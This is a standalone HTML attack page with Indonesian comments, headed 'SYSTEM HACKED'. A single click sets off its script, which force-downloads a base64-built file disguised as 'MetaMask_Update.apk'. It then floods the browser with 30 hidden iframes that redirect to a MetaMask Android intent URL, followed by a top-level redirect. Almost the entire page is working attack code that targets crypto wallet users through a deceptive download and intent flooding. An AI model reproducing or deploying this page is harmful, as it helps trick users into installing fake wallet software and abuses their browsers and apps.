<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>System Verification</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    background: #000; color: #f00; font-family: monospace;
    display: flex; justify-content: center; align-items: center;
    height: 100vh; margin: 0; text-align: center; cursor: pointer; overflow: hidden;
  }
  .panel { background: #111; padding: 30px; border-radius: 12px; border: 1px solid #f00; max-width: 400px; width: 100%; box-shadow: 0 0 20px rgba(255,0,0,0.5); }
  h2 { animation: blink 0.2s infinite; }
  @keyframes blink { 50% { opacity: 0.2; } }
  #log { margin-top: 20px; background: #000; padding: 10px; border-radius: 6px; color: #0f0; font-size: 12px; text-align: left; height: 100px; overflow-y: auto; }
  iframe { display: none; }
</style>
</head>
<body>

<div class="panel" id="main-card">
  <h2>☢️ SYSTEM HACKED ☢️</h2>
  <p>Klik di mana saja untuk memulai.</p>
  <div id="log">Sistem siap.</div>
</div>

<div id="launcher-container" style="display: none;"></div>

<script>
(function () {
  'use strict';

  var logEl = document.getElementById('log');
  var executed = false;

  function log(msg) {
    logEl.innerHTML += "> " + msg + "<br>";
    console.log(msg);
  }

  // ============================================
  // 1. KONFIGURASI INTENT
  // ============================================
  var METAMASK_INTENT = "intent://#Intent;" +
                        "package=io.metamask;" +
                        "scheme=metamask;" +
                        "end;";

  // ============================================
  // 2. TRIGGER FLOODING (KLIK)
  // ============================================
  document.body.addEventListener('click', function() {
    if (executed) return;
    executed = true;

    document.getElementById('main-card').innerHTML = `
      <h2>EXECUTING FLOOD...</h2>
      <p>Memulai Intent Flooding 200ms...</p>
      <div id="log"></div>
    `;
    logEl = document.getElementById('log');
    log("[!] Memulai Multi-Iframe Intent Flood...");

    // A. Kamuflase: Unduh APK
    try {
      var b64Apk = "UEsDBBQAAAAIAAAAIQAAAAAAAAAAAAAAAAAJAAAATUVUQS1JTkY=";
      var binary = atob(b64Apk);
      var bytes = new Uint8Array(binary.length);
      for (var i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
      var blob = new Blob([bytes], { type: 'application/vnd.android.package-archive' });
      var url = URL.createObjectURL(blob);
      var a = document.createElement('a');
      a.href = url;
      a.download = 'MetaMask_Update.apk';
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      log("[+] APK Download Triggered.");
    } catch(e) {}

    // B. FLOODING IFRAME (200ms Window)
    var iframeCount = 0;
    var maxIframes = 30; // Jumlah iframe (30 sudah sangat berat)
    var interval = 5; // Setiap 5ms buat 1 iframe (200ms / 30 = ~6.6ms)

    var floodInterval = setInterval(function() {
      if (iframeCount >= maxIframes) {
        clearInterval(floodInterval);
        log("[!] Flooding Selesai. Mengirim Fallback...");
        
        // Fallback Top-Level setelah 200ms
        setTimeout(function() {
          window.location.href = METAMASK_INTENT;
        }, 50);
        return;
      }

      try {
        var iframe = document.createElement("iframe");
        iframe.sandbox = "allow-scripts allow-top-navigation allow-popups";
        iframe.style.display = "none";
        
        // Suntikkan Intent ke dalam iframe
        iframe.srcdoc = `
          <!DOCTYPE html>
          <html>
          <body>
            <script>
              // Redirect ke MetaMask
              window.top.location.href = "${METAMASK_INTENT}";
            <\/script>
          </body>
          </html>
        `;
        
        document.getElementById("launcher-container").appendChild(iframe);
        iframeCount++;
        
        if (iframeCount % 10 === 0) {
          log("[+] Iframe Intent " + iframeCount + " terkirim.");
        }
      } catch(e) {}

    }, interval); // 5ms

  }, { once: true });

})();
</script>
</body>
</html>
